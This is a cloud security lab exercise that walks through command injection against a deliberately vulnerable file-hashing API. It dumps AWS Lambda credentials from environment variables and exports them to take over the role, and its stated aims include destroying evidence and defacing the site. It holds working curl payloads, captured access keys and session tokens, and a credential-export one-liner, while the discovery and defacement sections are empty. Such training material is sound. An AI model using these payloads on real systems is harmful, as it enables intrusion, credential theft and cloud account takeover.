# Exercise 4: Exploiting Evidence-App and Pivoting to Cloud Account

<!-- markdownlint-disable MD033-->

<!--Overriding style-->
<style>
  :root {
    --sans-primary-color: #ff0000;
}
</style>

**Estimated Time to Complete:** 15 minutes

## Objectives

* Continue to use command injection to acquire **cloud credentials** used by AWS Lambda function
* Discover what resources these newly-acquired credentials have access to
* Destroy all evidence and deface evidence-app web page

## Challenges

### Challenge 1: Steal Cloud Credentials From Lambda

When attempting to steal credentials from a system running in cloud, attackers may be drawn to hard-coded credentials like the `aws/credentials` file or interacting with a virtual machine's Instance Metadata Service (IMDS). This, however, is not quite how Lambda operates. When IAM roles are provisioned to Lambda function to allow them to interace with other cloud resources, you can find the credentials as environment variables:

* `AWS_ACCESS_KEY_ID`
* `AWS_SECRET_ACCESS_KEY`
* `AWS_SESSION_TOKEN`

Use your knowledge of how you can conduct command injection against this vulnerable application to acquire these three variable values which *should* give you some level of access into the greater cloud account. Once you have these values, set the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` values in your **CloudShell** session to become the Lambda role user.

??? cmd "Solution"

    1. If you recall the output of the `fuzz_evidence_app.py` script, there was a sample `curl` command to perform command injection.

        !!! summary "Sample Output"

            ```bash
            curl -X POST https://d3d7nz3kb2bgwk.cloudfront.net/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";id;","file_data":"dGVzdAo="}'
            ```

    2. You *could* run the script again, but here is the output (using `$TARGET` in place of the actual CloudFront URL):

        ```bash
        curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";id;","file_data":"dGVzdAo="}'
        ```

    3. If you want to list a user's environment variables, it's quite easy in Linux using the `env` command. So try to replace `id` with `env`:

        ```bash
        curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";env;","file_data":"dGVzdAo="}'
        ```

        !!! summary "Expected Results"

            ```bash
            {"message":"Internal Server Error"}
            ```
    
    4. Hmm... that doesn't seem to work. But why? After hours of troubleshooting, we found that there is a limitation in the amount of bytes you can store in an AWS DynamoDB table (which is where the MD5 and SHA1 results are stored). Are we defeated? No! We just need to massage the command a bit to get the results we're after.

    5. Try this command to limit the amount of characters returned by only matching lines that contain the variable names we're after:

        ```bash
        curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";env|egrep \"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\"","file_data":"dGVzdAo="}'
        ```

        !!! summary "Expected Result"

            ```bash
            Success
            ```

    6. Now we're talking! But where are the results? If you remember, to acquire the file name, MD5, and SHA1 sum data, you send a `GET` to `/api/`.

        ```bash
        curl $TARGET/api/
        ```

        !!! summary "Expected Results"

            ```{'Items': [{'SHA1Sum': {'S': '3395856ce81f2b7382dee72602f798b642f14140'}, 'FileName': {'S': 'EICAR.txt'}, 'MD5Sum': {'S': '44d88612fea8a8f36de82e1278abb02f'}}, {'SHA1Sum': {'S': 'AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEN///////////wEaCXVzLWVhc3QtMSJIMEYCIQCp+vAnVIPFDDPnmECKacY61Rrqsc7emBdIvsoIWMF91QIhANYRB3Rw2DvJY4Sk3rMPrkNoxRLQZNwj9wanDMqabn86KuQCCBcQARoMMjA2NzU3ODIwMTUxIgw8aj1avqzdcqRlyKcqwQIzRvTMpjsD/ZTuJiJQmKfWJiQtfFNImrtKY91QiUQTfzIjoMW0633HrANTJvB8tYWKsV6FQHhhwVOn7D0WztlcgGNXf/NyMmHxshVvlu/ipDNUnTZkXPeNbs0syiTfXRqiMdkferK/EVQaosFdKDIhYMMrb+KqWpWdbxjIwir/Rb2ueizFpkshAc+r4q/kTZYHPpADJeIDoKhdhJmafEEG93jtb80EyJ/BKB2eyeCoehYShUo64JtI48iSGa7BlMexveuCwl0t8kjoVUVrRQjsTJ6sXc5h4uUznICf9H5Pr1Bcylc4XPRZPkntKdJpjJkhlOu41/CWVz+Da4JcAMMC3IBFKwYMjg6PRJ7fFLvCDzhVdAdtlPvhXUNBJ1Lh0Dm43GrZAcV6yGmT4iOSqoPrFqWTI/c+eTuRwt/++NhXtfMw5ZymlgY6nQH2dYiGn7F9mIxHufN4HmRqeCkiJjCjKKV0G+/4O49gH8zkq6uyz7gHjC9PAshYuw0HulttuYnsmI0gLQG0IgWJMDGWQtltXjcqyUPa7QOA7pRp1dx2wR7zp0twiedM4EVt9P93ZgKVZBKgH7OXd8UKKhJiJTq54tuOdwhEd6CKTofO0Vc9cBFj5ZZDrOPnmH4wis14yTkRz7VaLnTX\nAWS_SECRET_ACCESS_KEY=Ps/agCnAAHRLSSuqyJcufGPWlYvolaMTsmVMQrIR\nAWS_ACCESS_KEY_ID=ASIATAI5Z633ZFF2S7VT\n'}, 'FileName': {'S': ';env|egrep "(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)"'}, 'MD5Sum': {'S': 'AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEN///////////wEaCXVzLWVhc3QtMSJIMEYCIQCp+vAnVIPFDDPnmECKacY61Rrqsc7emBdIvsoIWMF91QIhANYRB3Rw2DvJY4Sk3rMPrkNoxRLQZNwj9wanDMqabn86KuQCCBcQARoMMjA2NzU3ODIwMTUxIgw8aj1avqzdcqRlyKcqwQIzRvTMpjsD/ZTuJiJQmKfWJiQtfFNImrtKY91QiUQTfzIjoMW0633HrANTJvB8tYWKsV6FQHhhwVOn7D0WztlcgGNXf/NyMmHxshVvlu/ipDNUnTZkXPeNbs0syiTfXRqiMdkferK/EVQaosFdKDIhYMMrb+KqWpWdbxjIwir/Rb2ueizFpkshAc+r4q/kTZYHPpADJeIDoKhdhJmafEEG93jtb80EyJ/BKB2eyeCoehYShUo64JtI48iSGa7BlMexveuCwl0t8kjoVUVrRQjsTJ6sXc5h4uUznICf9H5Pr1Bcylc4XPRZPkntKdJpjJkhlOu41/CWVz+Da4JcAMMC3IBFKwYMjg6PRJ7fFLvCDzhVdAdtlPvhXUNBJ1Lh0Dm43GrZAcV6yGmT4iOSqoPrFqWTI/c+eTuRwt/++NhXtfMw5ZymlgY6nQH2dYiGn7F9mIxHufN4HmRqeCkiJjCjKKV0G+/4O49gH8zkq6uyz7gHjC9PAshYuw0HulttuYnsmI0gLQG0IgWJMDGWQtltXjcqyUPa7QOA7pRp1dx2wR7zp0twiedM4EVt9P93ZgKVZBKgH7OXd8UKKhJiJTq54tuOdwhEd6CKTofO0Vc9cBFj5ZZDrOPnmH4wis14yTkRz7VaLnTX\nAWS_SECRET_ACCESS_KEY=Ps/agCnAAHRLSSuqyJcufGPWlYvolaMTsmVMQrIR\nAWS_ACCESS_KEY_ID=ASIATAI5Z633ZFF2S7VT\n'}}, {'SHA1Sum': {'S': 'uid=993(sbx_user1051) gid=990 groups=990\n'}, 'FileName': {'S': ';id;'}, 'MD5Sum': {'S': 'uid=993(sbx_user1051) gid=990 groups=990\n'}}], 'Count': 3, 'ScannedCount': 3, 'ResponseMetadata': {'RequestId': 'I5QUGQR2NHDEOCGRUAHV0BLN1VVV4KQNSO5AEMVJF66Q9ASUAAJG', 'HTTPStatusCode': 200, 'HTTPHeaders': {'server': 'Server', 'date': 'Sat, 09 Jul 2022 14:26:43 GMT', 'content-type': 'application/x-amz-json-1.0', 'content-length': '2394', 'connection': 'keep-alive', 'x-amzn-requestid': 'I5QUGQR2NHDEOCGRUAHV0BLN1VVV4KQNSO5AEMVJF66Q9ASUAAJG', 'x-amz-crc32': '793005041'}, 'RetryAttempts': 0}}```

    7. It looks like we have credentials! You could use individual `export <VAR_NAME> <VAR_VALUE>` commands to set these credentials for use in your CloudShell session, but here is some Bash Kung Fu to do this for you:

        ```bash
        export AWS_ACCESS_KEY_ID=$(curl -s $TARGET/api/ | egrep -o "AWS_ACCESS_KEY_ID=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2)
        export AWS_SECRET_ACCESS_KEY=$(curl -s $TARGET/api/ | egrep -o "AWS_SECRET_ACCESS_KEY=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2,100)
        export AWS_SESSION_TOKEN=$(curl -s $TARGET/api/ | egrep -o "AWS_SESSION_TOKEN=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2,100)
        ```

### Challenge 2: Perform Discovery in Cloud Account

### Challenge 3: Destruction and Defacement

```curl -X POST https://d1dw3pytnie47k.cloudfront.net/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";env|egrep \"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\"","file_data":"dGVzdAo="}'```
